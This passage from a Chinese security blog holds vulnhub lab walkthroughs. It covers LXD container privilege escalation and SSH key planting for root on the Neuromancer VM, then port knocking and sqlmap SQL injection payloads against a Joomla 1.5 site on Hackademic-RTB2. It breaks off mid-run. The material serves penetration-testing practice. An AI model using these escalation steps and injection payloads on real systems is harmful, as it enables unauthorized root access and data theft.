class="line">(13/19) Installing busybox-suid (1.31.1-r9)</span><br><span class="line">(14/19) Installing busybox-initscripts (3.2-r2)</span><br><span class="line">Executing busybox-initscripts-3.2-r2.post-install</span><br><span class="line">(15/19) Installing scanelf (1.2.4-r0)</span><br><span class="line">(16/19) Installing musl-utils (1.1.24-r0)</span><br><span class="line">(17/19) Installing libc-utils (0.7.2-r0)</span><br><span class="line">(18/19) Installing alpine-keys (2.1-r2)</span><br><span class="line">(19/19) Installing alpine-base (3.11.3-r0)</span><br><span class="line">Executing busybox-1.31.1-r9.trigger</span><br><span class="line">OK: 8 MiB <span class="keyword">in</span> 19 packages</span><br><span class="line">root@kali:~/lxd-alpine-builder<span class="comment"># ls</span></span><br><span class="line">alpine-v3.11-x86_64-20200119_0151.tar.gz  build-alpine  LICENSE  README.md</span><br></pre></td></tr></table></figure>

<p>将alpine-v3.11-x86_64-20200119_0151.tar.gz传输到目标机上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ scp root@192.168.56.102:/root/lxd-alpine-builder/alpine-v3.11-x86_64-20200119_0151.tar.gz /tmp/</span><br><span class="line">root@192.168.56.102<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">alpine-v3.11-x86_64-20200119_0151.tar.gz                                             100% 3151KB   3.1MB/s   00:00    </span></span><br><span class="line"><span class="string">ta@neuromancer:/tmp$ ls</span></span><br><span class="line"><span class="string">alpine-v3.11-x86_64-20200119_0151.tar.gz</span></span><br><span class="line"><span class="string">f</span></span><br><span class="line"><span class="string">hsperfdata_ta</span></span><br><span class="line"><span class="string">systemd-private-14b0eedfa06043179575f7374dc44c6a-systemd-timesyncd.service-EqRj97</span></span><br></pre></td></tr></table></figure>

<p>要导入容器映像，使用以下命令：<br>“别名”是一种引用容器image而不是冗长的文件名的方便方法（根据lxc，它实际上是“指纹”）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc image import alpine-v3.11-x86_64-20200119_0151.tar.gz --<span class="built_in">alias</span> haxor</span><br><span class="line">Image imported with fingerprint: 468c747448ec99c6b76e5a943df89a21489eb5d605ebe5d4c341a78ec217a223</span><br><span class="line">ta@neuromancer:/tmp$ lxc image list</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+</span><br><span class="line">| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+</span><br><span class="line">| haxor | 468c747448ec | no     | alpine v3.11 (20200119_01:51) | x86_64 | 3.08MB | Jan 19, 2020 at 8:16am (UTC) |</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+</span><br></pre></td></tr></table></figure>

<p>接下来，您必须基于导入的容器映像创建一个实际的容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc init haxor -c security.privileged=<span class="literal">true</span></span><br><span class="line">Creating the container</span><br><span class="line">Container name is: right-whippet</span><br><span class="line">ta@neuromancer:/tmp$ lxc list</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">|     NAME      |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">| right-whippet | STOPPED |      |      | PERSISTENT | 0         |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br></pre></td></tr></table></figure>

<p>请注意，容器名称是自动分配的。我没有具体说明。尽管来自Ubuntu lxc开发人员很幽默。尽管Booj的文章包含了您需要的所有详细信息，但-c开关选项可以有效地为您提供整个主机文件系统所需的Yoda功能。接下来，需要为新容器（“ right-whippet”）指定磁盘安装选项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc config device add right-whippet whatever disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">Device whatever added to right-whippet</span><br></pre></td></tr></table></figure>

<p>如所见，装载主机文件系统的根目录/（Neuromancer），并装载为该命名（“whatever”）到/mnt/root。现在可以启动容器，然后使用以下命令进入bash会话：</p>
<p>启动容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc start right-whippet</span><br><span class="line">ta@neuromancer:/tmp$ lxc list</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">|     NAME      |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">| right-whippet | RUNNING |      |      | PERSISTENT | 0         |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br></pre></td></tr></table></figure>

<p>进入bash提权，成功拥有root权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc <span class="built_in">exec</span> right-whippet --mode=interactive /bin/sh</span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">~ <span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">~ <span class="comment"># ls</span></span><br><span class="line">~ <span class="comment"># pwd</span></span><br><span class="line">/root</span><br></pre></td></tr></table></figure>

<h2 id="步骤7-证明我们对Neuromancer文件系统具有根目录访问权限"><a href="#步骤7-证明我们对Neuromancer文件系统具有根目录访问权限" class="headerlink" title="步骤7-证明我们对Neuromancer文件系统具有根目录访问权限"></a>步骤7-证明我们对Neuromancer文件系统具有根目录访问权限</h2><p>我们进入容器的/mnt/root目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ <span class="comment"># cd /mnt/root</span></span><br><span class="line">/mnt/root <span class="comment"># ls</span></span><br><span class="line">bin         etc         lib         media       proc        sbin        sys         var</span><br><span class="line">boot        home        lib64       mnt         root        snap        tmp         vmlinuz</span><br><span class="line">dev         initrd.img  lost+found  opt         run         srv         usr</span><br></pre></td></tr></table></figure>

<p>您实际上是在查看主机（Neuromancer）文件系统的根目录。现在，可以轻松地将cd进入“root”，然后看到最重要的“flag.txt”文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/mnt/root <span class="comment"># cd root</span></span><br><span class="line">/mnt/root/root <span class="comment"># ls</span></span><br><span class="line">flag.txt      struts2       velocity.log</span><br><span class="line">/mnt/root/root <span class="comment"># cat flag.txt</span></span><br><span class="line">be3306f431dae5ebc93eebb291f4914a</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub169.jpg"></p>
<p>但是我们还没有完成。为了使该计划生效，需要能够写入root（即/mnt/root/root）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/mnt/root/root <span class="comment"># echo fuck-all-you-shit &gt; fuck.txt</span></span><br><span class="line">/mnt/root/root <span class="comment"># cat fuck.txt</span></span><br><span class="line">fuck-all-you-shit</span><br></pre></td></tr></table></figure>

<p>是的。有用！所以…现在，只需要获得一个root shell。</p>
<h2 id="步骤8：SSH密钥生成"><a href="#步骤8：SSH密钥生成" class="headerlink" title="步骤8：SSH密钥生成"></a>步骤8：SSH密钥生成</h2><p>现在有了写访问权，需要生成一组ssh密钥。仍在容器bash会话（right-whippet）中时，该过程涉及：</p>
<ul>
<li>运行ssh-keygen。选择您喜欢的任何选项，但确保文件保存到/mnt/root/root/.ssh</li>
<li>创建一个authorized_keys文件: touch /mnt/root/root/.ssh/authorized_keys</li>
<li>将新创建的公共密钥的内容分配到授权密钥文件中： cat /mnt/root/root/.ssh/id_rsa.pub &gt;&gt; authorized_keys</li>
</ul>
<p>将之前/home/ta/.ssh目录下的文件拷贝到/mnt/root/root/.ssh/下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/mnt/root/root/.ssh <span class="comment"># cp /mnt/root/home/ta/.ssh/authorized_keys authorized_keys</span></span><br><span class="line">/mnt/root/root/.ssh <span class="comment"># ls</span></span><br><span class="line">authorized_keys  known_hosts</span><br><span class="line">/mnt/root/root/.ssh <span class="comment"># cp /mnt/root/home/ta/.ssh/id_rsa id_rsa</span></span><br><span class="line">/mnt/root/root/.ssh <span class="comment"># cp /mnt/root/home/ta/.ssh/id_rsa.pub id_rsa.pub</span></span><br></pre></td></tr></table></figure>

<p>/mnt/root/root/.ssh的内容现在应如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/mnt/root/root/.ssh <span class="comment"># ls</span></span><br><span class="line">authorized_keys  id_rsa           id_rsa.pub       known_hosts</span><br></pre></td></tr></table></figure>

<h2 id="步骤9：将密钥复制到攻击机中"><a href="#步骤9：将密钥复制到攻击机中" class="headerlink" title="步骤9：将密钥复制到攻击机中"></a>步骤9：将密钥复制到攻击机中</h2><p>由于使用的是之前/home/ta/.ssh/目录下的文件，所以连接的话，如下连接即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh -i /root/.ssh/id_rsa -p 34483 root@192.168.56.110</span></span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">|                Neuromancer Secure Remote Access                |</span><br><span class="line">| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |</span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">94 packages can be updated.</span><br><span class="line">44 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Jul  3 22:02:40 2018</span><br><span class="line">root@neuromancer:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@neuromancer:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@neuromancer:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>成功连接，密码还是之前连接ta的123456</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub170.jpg"></p>
<p>在“right-whippet” sh会话中执行此操作的最简单方法是，将id_rsa和id_rsa.pub的内容显示在屏幕上，然后将其复制/粘贴到您喜欢的文本编辑器中。确保将文件权限更改为chmod 400，否则当尝试使用它们时，这些键将被忽略（我浪费了一些时间想知道为什么直到这样做之前，这些键才一直不起作用）。</p>
<p>现在只想说，太帅会不会帅死人。。。:)))):::)))::))</p>
<h4 id="提权2总结"><a href="#提权2总结" class="headerlink" title="提权2总结"></a>提权2总结</h4><p>总而言之，Neuromancer是一台非常有趣的机器。为了达到目的，必须root另一box（Straylight），然后学习如何正确使用socat进行端口转发。一旦在Neuromancer上使用了低特权shell，特权映射就非常简单了……至少对于内核利用途径而言。但是，很高兴发现lxd提权线索隐藏在范围内.</p>
<p>我只是涉足容器（Docker）之前就某些漏洞进行了一些实验工作，但是从未真正使用容器配置问题来在主机上root。我四处搜寻以确定其他文章是否也涵盖了这个角度，但是到目前为止我还没有发现。因此…最好做一些别人可能会觉得有用的新事情。</p>
<p><font color="red">Neuromancer知识点总结:</font></p>
<ul>
<li>tty可交互式shell</li>
<li>ssh-key毒化</li>
<li>lxd容器提权(new)</li>
<li>scp命令传输文件</li>
<li>tomcat-users.xml密码泄露</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Hackademic-RTB2]</title>
    <url>/2019/12/12/Hackademic-RTB2/</url>
    <content><![CDATA[<p>名称：Hackademic：RTB2<br>发布日期：2011年9月6日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrYWRlbWljL0hhY2thZGVtaWMuUlRCMi56aXA=">https://download.vulnhub.com/hackademic/Hackademic.RTB2.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrYWRlbWljL0hhY2thZGVtaWMuUlRCMi56aXAudG9ycmVudA==">https://download.vulnhub.com/hackademic/Hackademic.RTB2.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>这是mr.pr0n提出的第二个现实黑客攻击挑战<br>下载目标并获得root。<br>毕竟，尝试读取根目录中文件“ key.txt”的内容。<br>请享用！</p>
<p>漏洞：</p>
<ul>
<li>纯文本密码</li>
<li>特权提升</li>
<li>SQL注入</li>
<li>不受限制地上传危险类型的文件</li>
</ul>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>老规矩上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.84.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.142</span><br><span class="line">Host is up (0.00022s latency).</span><br><span class="line">MAC Address: 00:0C:29:74:B5:21 (VMware)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -A -v -sS -Pn -T4 --script=vuln 192.168.84.142</span></span><br><span class="line">80/tcp  open     http    Apache httpd 2.2.14 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.84.142</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.142:80/</span><br><span class="line">|     Form id: username</span><br><span class="line">|_    Form action: check.php</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /phpmyadmin/: phpMyAdmin</span></span><br><span class="line"><span class="string">|   /icons/: Potentially interesting folder w/ directory listing</span></span><br><span class="line"><span class="string">|_  /index/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.2.14 (Ubuntu)</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:apache:http_server:2.2.14: </span><br><span class="line">|       CVE-2010-0425   10.0    https://vulners.com/cve/CVE-2010-0425</span><br><span class="line">|       CVE-2011-3192   7.8     https://vulners.com/cve/CVE-2011-3192</span><br><span class="line">|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679</span><br><span class="line">|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668</span><br><span class="line">|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169</span><br><span class="line">|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167</span><br><span class="line">|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249</span><br><span class="line">|       CVE-2012-0883   6.9     https://vulners.com/cve/CVE-2012-0883</span><br><span class="line">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span><br><span class="line">|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862</span><br><span class="line">|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231</span><br><span class="line">|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098</span><br><span class="line">|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438</span><br><span class="line">|       CVE-2012-4557   5.0     https://vulners.com/cve/CVE-2012-4557</span><br><span class="line">|       CVE-2011-3368   5.0     https://vulners.com/cve/CVE-2011-3368</span><br><span class="line">|       CVE-2010-2068   5.0     https://vulners.com/cve/CVE-2010-2068</span><br><span class="line">|       CVE-2010-1452   5.0     https://vulners.com/cve/CVE-2010-1452</span><br><span class="line">|       CVE-2010-0408   5.0     https://vulners.com/cve/CVE-2010-0408</span><br><span class="line">|       CVE-2012-0031   4.6     https://vulners.com/cve/CVE-2012-0031</span><br><span class="line">|       CVE-2011-3607   4.4     https://vulners.com/cve/CVE-2011-3607</span><br><span class="line">|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975</span><br><span class="line">|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896</span><br><span class="line">|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558</span><br><span class="line">|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499</span><br><span class="line">|       CVE-2012-0053   4.3     https://vulners.com/cve/CVE-2012-0053</span><br><span class="line">|       CVE-2011-4317   4.3     https://vulners.com/cve/CVE-2011-4317</span><br><span class="line">|       CVE-2011-3639   4.3     https://vulners.com/cve/CVE-2011-3639</span><br><span class="line">|       CVE-2011-3348   4.3     https://vulners.com/cve/CVE-2011-3348</span><br><span class="line">|       CVE-2011-0419   4.3     https://vulners.com/cve/CVE-2011-0419</span><br><span class="line">|       CVE-2010-0434   4.3     https://vulners.com/cve/CVE-2010-0434</span><br><span class="line">|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612</span><br><span class="line">|       CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687</span><br><span class="line">|_      CVE-2011-4415   1.2     https://vulners.com/cve/CVE-2011-4415</span><br><span class="line">666/tcp filtered doom</span><br></pre></td></tr></table></figure>

<p>经过尝试发现80端口没有什么好东西，666端口被过滤,源代码中没有任何内容，可疑标头，登录中没有sql注入。 我在目标上运行了OpenVAS，Dirbuster和Nikto，但是除了Phpmyadmin界面外，什么都没有发现，无论执行什么操作，该界面始终使我“无法连接到MySQL服务器”错误。 我以为Web服务器可能是一个错误的前端，而这可能是机器上隐藏的其他东西，所以接下来我运行了UDP扫描，它显示了一个附加端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sU -F -n -T4 -v 192.168.84.142</span></span><br><span class="line">5353/udp  open          zeroconf</span><br></pre></td></tr></table></figure>

<p>在<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguODQuMTQzLyVFNyU5OSVCQiVFOSU5OSU4NiVFOSVBMSVCNSVFOSU5RCVBMiVFOCVCRSU5MyVFNSU4NSVBNSYjMzk7">http://192.168.84.143/登陆页面输入&#39;<i class="fa fa-external-link-alt"></i></span> or 1=1–’  ///  ‘ or 1=1–’发现返回了一个页面其中有Ok, nice shot…<br>…but, you are looking in a wrong place bro! ;-),直接右键查看源代码，发现异常字符串</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure>

<p>先url解码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e 0d 0a 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 69 6e 27 20 6f 6e 20 68 65 61 76 65 6e 27 73 20 64 6f 6f 72 20 2e 2e 20 3a 29 0d 0ad 0a 3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e</span><br></pre></td></tr></table></figure>

<p>再hex解码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt; - - - - - - - - - &gt; </span><br><span class="line"> </span><br><span class="line"> K n o c k   K n o c k   K n o c k i n <span class="string">&#x27;   o n   h e a v e n &#x27;</span> s   d o o r   . .   : ) </span><br><span class="line"> </span><br><span class="line"> 0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1 </span><br><span class="line"> </span><br><span class="line"> &lt; - - - - - - - - - &gt;</span><br></pre></td></tr></table></figure>

<p>再二进制解码,<span class="exturl" data-url="aHR0cDovL3d3dy5zbmFya2xlcy5uZXQvc2NyaXB0cy9zbmVhay9zbmVhay5waHA=">SNEAK: Snarkles.Net Encryption Assortment Kit - Version 1.28<i class="fa fa-external-link-alt"></i></span>,得到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1001:1101:1011:1001</span><br></pre></td></tr></table></figure>

<p>看来是做了端口碰撞措施，端口碰撞的主要目的是通过进行端口扫描来防止攻击者扫描系统以寻找可能被利用的服务，因为除非攻击者发送正确的碰撞顺序，否则受保护的端口将显得关闭。编写下列bash脚本打开666端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 1001 1101 1011 1001</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">nc 192.168.84.143 80 <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>运行脚本，稍等片刻端口即可打开</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ./knock.sh</span></span><br></pre></td></tr></table></figure>

<p>进一步的版本扫描表明这是多播DNS协议。找不到任何可利用的东西。再次使用详细标志和–packet-trace选项运行Nmap，这一次它返回了一个新端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -v -sS -Pn -T4 --packet-trace 192.168.84.142</span><br><span class="line"></span><br><span class="line">NSE: TCP 192.168.84.135:52112 &gt; 192.168.84.142:666 | CLOSE</span><br><span class="line">NSOCK INFO [20.7300s] nsock_iod_delete(): nsock_iod_delete (IOD <span class="comment">#70)</span></span><br><span class="line">NSE: TCP 192.168.84.135:41738 &gt; 192.168.84.142:80 | CLOSE</span><br><span class="line">NSOCK INFO [20.7300s] nsock_iod_delete(): nsock_iod_delete (IOD <span class="comment">#71)</span></span><br><span class="line">Completed NSE at 02:17, 0.10s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.142</span><br><span class="line">Host is up (0.00049s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">80/tcp  open  http    Apache httpd 2.2.14 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.2.14 (Ubuntu)</span><br><span class="line">|_http-title: Hackademic.RTB2</span><br><span class="line">666/tcp open  http    Apache httpd 2.2.14 ((Ubuntu))</span><br><span class="line">|_http-generator: Joomla! 1.5 - Open Source Content Management</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-robots.txt: 14 disallowed entries </span><br><span class="line">| /administrator/ /cache/ /components/ /images/ </span><br><span class="line">| /includes/ /installation/ /language/ /libraries/ /media/ </span><br><span class="line">|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/</span><br><span class="line">|_http-server-header: Apache/2.2.14 (Ubuntu)</span><br><span class="line">|_http-title: Hackademic.RTB2</span><br></pre></td></tr></table></figure>

<p>一定是以前报告为已过滤的端口。 版本扫描显示这实际上是另一台Web服务器！nmap牛逼！！！firefox访问666端口</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub45.jpg"></p>
<p>可以看到是joomla 1.5 templates版本的。</p>
<h3 id="使用自己的方法getshell"><a href="#使用自己的方法getshell" class="headerlink" title="使用自己的方法getshell"></a>使用自己的方法getshell</h3><p>点击下图所示的位置，burp抓包保存为sqlmap.txt，然后sqlmap -r跑此包,发现是dba权限的注入能–os-shell，多年前的老靶机果真是够垃圾，我主要是用来学习各种漏洞知识点，以便于实战碰到的话，能够迅速联想到是什么漏洞并且成功利用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt --is-dba</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                           </span><br><span class="line"> ___ ___[<span class="string">&#x27;]_____ ___ ___  &#123;1.3.12#stable&#125;                                                              </span></span><br><span class="line"><span class="string">|_ -| . [)]     | .&#x27;</span>| . |                                                                              </span><br><span class="line">|___|_  [<span class="string">&quot;]_|_|_|__,|  _|                                                                              </span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org                                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 03:21:49 /2019-12-12/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:21:49] [INFO] parsing HTTP request from &#x27;sqlmap.txt&#x27;</span></span><br><span class="line"><span class="string">[03:21:49] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[03:21:49] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: letter (GET)</span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: option=com_abc&amp;view=abc&amp;letter=List of content items...&#x27; AND (SELECT 4640 FROM(SELECT COUNT(*),CONCAT(0x7170786b71,(SELECT (ELT(4640=4640,1))),0x716b787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uVyL&amp;Itemid=3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: option=com_abc&amp;view=abc&amp;letter=List of content items...&#x27; AND (SELECT 1182 FROM (SELECT(SLEEP(5)))sLUv)-- PIge&amp;Itemid=3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: MySQL UNION query (NULL) - 2 columns</span></span><br><span class="line"><span class="string">    Payload: option=com_abc&amp;view=abc&amp;letter=List of content items...&#x27; UNION ALL SELECT NULL,CONCAT(0x7170786b71,0x5248524f517a4a6d7669416152587a486a48704b4a45444c534d74786659424f614f7147534d7965,0x716b787871)#&amp;Itemid=3</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[03:21:49] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0</span></span><br><span class="line"><span class="string">[03:21:49] [INFO] testing if current user is DBA</span></span><br><span class="line"><span class="string">[03:21:49] [INFO] fetching current user</span></span><br><span class="line"><span class="string">current user is DBA: True</span></span><br><span class="line"><span class="string">[03:21:49] [INFO] fetched data logged to text files under &#x27;/root/.sqlmap/output/192.168.84.142&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 03:21:49 /2019-12-12/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@kali:~# sqlmap -r sqlmap.txt --os-shell</span></span><br><span class="line"><span class="string">        ___</span></span><br><span class="line"><span class="string">       __H__                                                                                           </span></span><br><span class="line"><span class="string"> ___ ___[(]_____ ___ ___  &#123;1.3.12#stable&#125;                                                              </span></span><br><span class="line"><span class="string">|_ -| . [&quot;</span>]     | .<span class="string">&#x27;| . |                                                                              </span></span><br><span class="line"><span class="string">|___|_  [(]_|_|_|__,|  _|                                                                              </span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org                                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 03:45:59 